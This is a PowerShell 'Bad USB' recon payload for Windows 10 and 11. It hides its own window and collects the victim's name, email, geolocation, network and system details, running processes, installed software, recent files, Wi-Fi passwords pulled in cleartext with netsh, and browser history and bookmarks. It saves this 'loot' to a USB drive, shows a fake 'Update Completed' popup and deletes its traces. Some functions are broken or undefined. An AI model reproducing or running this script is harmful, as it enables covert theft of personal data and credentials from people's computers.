#############################################################################################################################################
#   ____  _             ____ _ _            ____  _     _____ ____  _             ____  _     _     _____ ____  _     _____ ____  _         #
#  |  _ \(_)_ __   __ _|  _ (_) | ___  ___|  _ \| |   | ____|  _ \| |           |  _ \| |   / \   | ____|  _ \| |   | ____|  _ \| |         #
#  | |_) | | '_ \ / _` | | | | | |/ _ \/ __| | | | |   |  _| | |_) | |   ______  | |_) | |  / _ \  |  _| | |_) | |   |  _| | |_) | |        #
#  |  __/| | | | | (_| | |_| | | |  __/\__ \ |_| | |___| |___|  __/| |  |______| |  __/| | / ___ \ | |___|  _ <| |___| |___|  __/| |___     #
#  |_|   |_|_| |_|\__,_|____/|_|_|\___||___/____/|_____|_____|_|   |_|           |_|   |_|/_/   \_\_____|_| \_\_____|_____|_|   |_____      #
#                                                                                                                                           #
#############################################################################################################################################


############################################################################################################################################################
#############################################################################################################################################
# Title        : Bad USB          |  
# Author       : dion@d10xi24     |                             
# Version      : 1.0              |   
# Category     : Recon            |      
# Target       : Windows 10,11    |      
#############################################################################################################################################
############################################################################################################################################################


# Load required assemblies
$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
Add-Type -Name Win -Member $i -Namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)



############################################################################################################################################################

# Function to create loot folder, file, and zip
function Initialize-LootFolder {
    $FolderName = "$env:USERNAME-LOOT-$(Get-Date -f yyyy-MM-dd_hh-mm-ss)"
    $ZIP = "$FolderName.zip"
    
    New-Item -Path $env:TEMP/$FolderName -ItemType Directory

    return $FolderName, $ZIP
}

############################################################################################################################################################

# Function to get user's full name
function Get-FullName {
    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
    catch {
        Write-Error "No name was detected"
        return $env:USERNAME
        -ErrorAction SilentlyContinue
    }

    return $fullName
}

############################################################################################################################################################

# Function to get user's email
function Get-Email {
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
        return $email
    }
    catch {
        Write-Error "An email was not found"
        return "No Email Detected"
        -ErrorAction SilentlyContinue
    }
}

############################################################################################################################################################

# Function to get geolocation
function Get-GeoLocation {
    try {
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()

        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
            Start-Sleep -Milliseconds 100
        }

        if ($GeoWatcher.Permission -eq 'Denied') {
            Write-Error 'Access Denied for Location Information'
        } else {
            $GeoWatcher.Position.Location | Select-Object Latitude, Longitude
        }
    }
    catch {
        Write-Error "No coordinates found"
        return "No Coordinates found"
        -ErrorAction SilentlyContinue
    }
}

############################################################################################################################################################

# Function to get UAC state
function Get-UACState {
    $Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    $ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin"
    $PromptOnSecureDesktop_Name = "PromptOnSecureDesktop"

    $ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name
    $PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name

    if ($ConsentPromptBehaviorAdmin_Value -eq 0 -and $PromptOnSecureDesktop_Value -eq 0) {
        return "UAC State: Never notify"
    }
    elseif ($ConsentPromptBehaviorAdmin_Value -eq 5 -and $PromptOnSecureDesktop_Value -eq 0) {
        return "UAC State: Notify me only when apps try to make changes to my computer (do not dim my desktop)"
    }
    elseif ($ConsentPromptBehaviorAdmin_Value -eq 5 -and $PromptOnSecureDesktop_Value -eq 1) {
        return "UAC State: Notify me only when apps try to make changes to my computer (default)"
    }
    elseif ($ConsentPromptBehaviorAdmin_Value -eq 2 -and $PromptOnSecureDesktop_Value -eq 1) {
        return "UAC State: Always notify"
    }
    else {
        return "UAC State: Unknown"
    }
}

############################################################################################################################################################

# Function to get LSASS state
function Get-LSASSState {
    $lsass = Get-Process -Name "lsass"
    return $lsass.ProtectedProcess ? "LSASS is running as a protected process." : "LSASS is not running as a protected process."
}

############################################################################################################################################################

# Function to get RDP state
function Get-RDPState {
    $RDPValue = (Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections
    return $RDPValue -eq 0 ? "RDP is Enabled" : "RDP is NOT enabled"
}

############################################################################################################################################################

# Function to get public and local IPs
function Get-IPInfo {
    try {
        $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    }
    catch {
        $computerPubIP = "Error getting Public IP"
    }

    try {
        $localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress, PrefixOrigin | Out-String
    }
    catch {
        $localIP = "Error getting local IP"
    }

    $MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select-Object Name, MacAddress, Status | Out-String

    return $computerPubIP, $localIP, $MAC
}

############################################################################################################################################################

# Function to get computer information
function Get-ComputerInfo {
    $computerSystem = Get-CimInstance CIM_ComputerSystem

    $computerName = $computerSystem.Name
    $computerModel = $computerSystem.Model
    $computerManufacturer = $computerSystem.Manufacturer
    $computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String
    $computerOs = (Get-WMIObject win32_operatingsystem) | Select-Object Caption, Version  | Out-String
    $computerCpu = Get-WmiObject Win32_Processor | Select-Object DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List  | Out-String
    $computerMainboard = Get-WmiObject Win32_BaseBoard | Format-List  | Out-String
    $computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String
    $computerRam = Get-WmiObject Win32_PhysicalMemory | Select-Object DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String
    $videocard = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String

    return $computerName, $computerModel, $computerManufacturer, $computerBIOS, $computerOs, $computerCpu, $computerMainboard, $computerRamCapacity, $computerRam, $videocard
}

############################################################################################################################################################

# Function to get startup contents
function Get-StartUpContents {
    $StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name
    return $StartUp
}

############################################################################################################################################################

# Function to get scheduled tasks
function Get-ScheduledTasks {
    $ScheduledTasks = Get-ScheduledTask
    return $ScheduledTasks
}

############################################################################################################################################################

# Function to get logon sessions
function Get-LogonSessions {
    $klist = klist sessions
    return $klist
}

############################################################################################################################################################

# Function to get recent files
function Get-RecentFiles {
    $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime
    return $RecentFiles
}

############################################################################################################################################################

# Function to get HDD information
function Get-HDDInfo {
    $driveType = @{
        2 = "Removable disk "
        3 = "Fixed local disk "
        4 = "Network disk "
        5 = "Compact disk "
    }
    $Hdds = Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } | Out-String

    return $Hdds
}

############################################################################################################################################################

# Function to get COM devices
function Get-COMDevices {
    $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String -width 250
    return $COMDevices
}

############################################################################################################################################################

# Function to get network interfaces
function Get-NetworkInterfaces {
    $NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -notlike $null }  | Select-Object Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -width 250
    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object{$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object{$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

    return $NetworkAdapters, $wifiProfiles
}

############################################################################################################################################################

# Function to get process information
function Get-ProcessInfo {
    $process = Get-WmiObject win32_process | Select-Object Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -width 250
    $listener = Get-NetTCPConnection | Select-Object @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
    $listener = $listener | foreach-object {
        $listenerItem = $_
        $processItem = ($process | Where-Object { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
        new-object PSObject -property @{
            "LocalAddress" = $listenerItem.LocalAddress
            "RemoteAddress" = $listenerItem.RemoteAddress
            "State" = $listenerItem.State
            "AppliedSetting" = $listenerItem.AppliedSetting
            "OwningProcess" = $listenerItem.OwningProcess
            "ProcessName" = $processItem.ProcessName
        }
    } | Select-Object LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250
    $service = Get-WmiObject win32_service | Select-Object State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName | Out-String -width 250
    $software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -width 250
    $drivers = Get-WmiObject Win32_PnPSignedDriver| Where-Object { $_.DeviceName -notlike $null } | Select-Object DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -width 250
    $videocard = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -width 250

    return $process, $listener, $service, $software, $drivers, $videocard
}

############################################################################################################################################################

# Function to get browser data
function Get-BrowserData {
    param (
        [Parameter(Position=1, Mandatory=$True)]
        [string]$Browser,    
        [Parameter(Position=1, Mandatory=$True)]
        [string]$DataType 
    ) 

    if ($Browser -eq 'chrome' -and $DataType -eq 'history'   )  { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" }
    elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks' )  { $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'history'   )  { $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History" }
    elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks' )  { $Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks" }
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  { $Path = "$Env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" }
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'bookmarks' )  { $Path = "$Env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\bookmarks.json" }
    else {
        Write-Error "Invalid browser or data type specified."
        return
    }

    try {
        if ($DataType -eq 'history') {
            $BrowserData = Get-BrowserHistory -Path $Path
        }
        elseif ($DataType -eq 'bookmarks') {
            $BrowserData = Get-BrowserBookmarks -Path $Path
        }
        else {
            Write-Error "Invalid data type specified."
            return
        }
    }
    catch {
        Write-Error "Error retrieving browser data: $_"
        return
    }

    return $BrowserData
}

############################################################################################################################################################

function Get-BrowserHistory {
    param (
        [Parameter(Position=1, Mandatory=$True)]
        [string]$Path
    )

    $ConnectionString = "Data Source=$Path;Version=3;New=False;Compress=True;"

    $Connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
    $Connection.ConnectionString = $ConnectionString
    $Connection.Open()

    $Query = "SELECT title, url, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 50;"
    $Command = $Connection.CreateCommand()
    $Command.CommandText = $Query

    $Reader = $Command.ExecuteReader()

    $History = @()
    while ($Reader.Read()) {
        $Title = $Reader["title"]
        $URL = $Reader["url"]
        $LastVisitDate = [System.DateTime]::ParseExact($Reader["last_visit_date"], 'yyyyMMddHHmmss', [System.Globalization.CultureInfo]::InvariantCulture)

        $History += [PSCustomObject]@{
            Title = $Title
            URL = $URL
            LastVisitDate = $LastVisitDate
        }
    }

    $Connection.Close()

    return $History
}

############################################################################################################################################################

function Get-BrowserBookmarks {
    param (
        [Parameter(Position=1, Mandatory=$True)]
        [string]$Path
    )

    $Bookmarks = Get-Content -Path $Path | ConvertFrom-Json

    $BookmarkList = @()
    foreach ($bookmark in $Bookmarks.roots.bookmark_bar.children) {
        $BookmarkList += [PSCustomObject]@{
            Title = $bookmark.name
            URL = $bookmark.url
        }
    }

    return $BookmarkList
}


############################################################################################################################################################

############################################################################################################################################################

############################################################################################################################################################

# Main execution
try {
    # Load required assemblies
    $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
    Add-Type -Name Win -Member $i -Namespace native
    [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

    # Initialize loot folder
    $FolderName, $ZIP = Initialize-LootFolder

    # Gather general information
    $UserName = $env:USERNAME
    $FullName = Get-FullName
    $Email = Get-Email
    $GeoLocation = Get-GeoLocation
    $UACState = Get-UACState
    $LSASSState = Get-LSASSState
    $RDPState = Get-RDPState
    $IPInfo = Get-IPInfo
    $ComputerInfo = Get-ComputerInfo
    $StartUpContents = Get-StartUpContents
    $ScheduledTasks = Get-ScheduledTasks
    $LogonSessions = Get-LogonSessions
    $RecentFiles = Get-RecentFiles
    $HDDInfo = Get-HDDInfo
    $COMDevices = Get-COMDevices
    $NetworkInterfaces, $WifiProfiles = Get-NetworkInterfaces
    $ProcessInfo, $ListenerInfo, $ServiceInfo, $SoftwareInfo, $DriverInfo, $VideoCardInfo = Get-ProcessInfo

    # Gather browser data
    $ChromeHistory = Get-BrowserData -Browser 'chrome' -DataType 'history'
    $ChromeBookmarks = Get-BrowserData -Browser 'chrome' -DataType 'bookmarks'
    $EdgeHistory = Get-BrowserData -Browser 'edge' -DataType 'history'
    $EdgeBookmarks = Get-BrowserData -Browser 'edge' -DataType 'bookmarks'
    $FirefoxHistory = Get-BrowserData -Browser 'firefox' -DataType 'history'
    $FirefoxBookmarks = Get-BrowserData -Browser 'firefox' -DataType 'bookmarks'

    # Create the loot file
    $output = @"
User Information:
Username: $UserName
Full Name: $FullName
Email: $Email
GeoLocation: $GeoLocation

------------------------------------------------------------------------------------------------------------------------------

System Information:
$UACState
$LSASSState
$RDPState

------------------------------------------------------------------------------------------------------------------------------

Network Information:
Public IP: $($IPInfo[0])
Local IP, MAC Address:
$($IPInfo[1])
$($IPInfo[2])

------------------------------------------------------------------------------------------------------------------------------

Computer Information:
$($ComputerInfo[0])
$($ComputerInfo[1])
$($ComputerInfo[2])

------------------------------------------------------------------------------------------------------------------------------

BIOS Information:
$($ComputerInfo[3])
Operating System Information:
$($ComputerInfo[4])
CPU Information:
$($ComputerInfo[5])
Mainboard Information:
$($ComputerInfo[6])
RAM Information:
Capacity: $($ComputerInfo[7])
Details:
$($ComputerInfo[8])
Video Card Information:
$($ComputerInfo[9])

------------------------------------------------------------------------------------------------------------------------------

Startup Contents:
$StartUpContents

Scheduled Tasks:
$ScheduledTasks

Logon Sessions:
$LogonSessions

Recent Files:
$RecentFiles

HDD Information:
$HDDInfo

COM Devices:
$COMDevices

------------------------------------------------------------------------------------------------------------------------------

Network Interfaces:
$NetworkInterfaces
Wifi Profiles:
$WifiProfiles

------------------------------------------------------------------------------------------------------------------------------

Processes:
$ProcessInfo
Listeners:
$ListenerInfo
Services:
$ServiceInfo
Installed Software:
$SoftwareInfo
Installed Drivers:
$DriverInfo
Video Card Information:
$VideoCardInfo

------------------------------------------------------------------------------------------------------------------------------

Browser Data:
Google Chrome History:
$ChromeHistory

Google Chrome Bookmarks:
$ChromeBookmarks

Microsoft Edge History:
$EdgeHistory

Microsoft Edge Bookmarks:
$EdgeBookmarks

Mozilla Firefox History:
$FirefoxHistory

Mozilla Firefox Bookmarks:
$FirefoxBookmarks
"@

    $output > $env:TEMP\$FolderName\computerData.txt

    # Zip the loot folder
    Compress-Archive -Path $env:TEMP\$FolderName -DestinationPath $env:TEMP\$ZIP

    # Retrieve the temp folder path
    $tempFolderPath = Join-Path $env:TEMP $FolderName

    # Move the loot folder to the pendrive
    $pendrivePath = 'F:\'  # Replace with the actual drive letter of your pendrive
    Move-Item -Path $tempFolderPath -Destination $pendrivePath -Force

    # Popup message to signal the payload is done
    $done = New-Object -ComObject Wscript.Shell
    $done.Popup("Update Completed", 1)

    # Cleanup
    Remove-Item -Path $tempFolderPath -Recurse -Force
}
catch {
    Write-Error "An error occurred: $_"
}